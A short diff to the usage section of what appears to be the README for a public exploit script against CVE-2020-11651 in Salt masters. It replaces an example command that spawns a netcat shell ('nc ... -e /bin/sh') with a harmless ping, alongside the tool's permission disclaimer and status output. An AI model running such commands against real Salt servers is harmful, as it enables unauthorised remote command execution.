@@ -34,7 +34,7 @@ root@p314d0:~/salt#
 Executing arbitrary commands on the master:
 
 ```
-root@p314d0:~/salt# python3 exploit.py --master 192.168.115.130 --exec "nc 127.0.0.1 4444 -e /bin/sh"
+root@p314d0:~/salt# python3 exploit.py --master 192.168.137.62 --exec "ping -c 4 192.168.45.174"
 [!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
 [+] Checking salt-master (192.168.115.130:4506) status... ONLINE
 [+] Checking if vulnerable to CVE-2020-11651...
